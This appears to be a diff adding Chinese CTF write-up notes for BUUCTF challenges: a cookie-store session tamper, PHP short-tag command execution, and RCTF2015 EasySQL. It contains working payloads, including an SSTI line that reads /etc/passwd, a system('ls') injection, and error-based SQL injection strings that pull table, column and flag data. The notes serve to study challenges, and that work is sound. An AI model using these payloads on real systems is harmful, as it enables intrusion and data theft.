@@ -677,3 +677,67 @@ print(res.text)
 `?search={{config.__class__.__init__['__glo'+'bals__']['os'].popen('cat /etc/passwd').read()}}`
 
 **注意:**拼接绕过就不能用`.`应该用`[]`
+
+
+
+# buuctf cookie store
+
+很明显让我们买flag
+
+先尝试买一个1块的东西,抓包好发现base64编码的session
+
+尝试在发送后返回的数据包基础上加上flag cookie
+
+没有得到flag
+
+那么尝试修改session中money的数值来购买flag
+
+
+
+# buuctf writeshell
+
+- PHP短标签
+- 空格过滤用%09绕过
+
+先想到文件上传,但是过滤了`_`,所以考虑命令执行
+
+php短标签:
+
+例如:`data=<?=system("ls")?>`
+
+
+
+# buuctf [RCTF2015]EasySQL
+
+此题很好的考察了我不太熟练的知识点
+
+- **regexp**和**reverse**的应用
+- 二次注入
+
+弹窗invalid string说明存在过滤,这里应该存在注入点
+
+在注册的时候，fuzz测试发现在username和email中过滤了以下字符
+
+登录发现还有改密码界面
+
+可以在注册用户名时加上`\`比如`aaa\`
+
+这样在改密码界面会报错,可以发现`"`闭合
+
+然后登录，在修改密码的时候，发现报错了，这样基本确定应该存在二次注入，在注册的时候写入，改密码的地方修改密码后触发导致错误输出，有错误回显就可以使用报错注入
+
+接下来使用报错注入,
+
+记下payload,方便日后查阅regexp和reverse用法:
+
+```
+0"||extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))))||"
+//查询表名
+0"||extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())&&(table_name='users'))))||"
+//查询列名
+0"||extractvalue(1,concat('~',(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))))||"
+//regexp查询f开头的字符串并返回
+0"||extractvalue(1,concat('~',reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))))||"
+//reverse逆转输出,!!!everse附近的括号!!!改了一下sql语句都会报错
+```
+
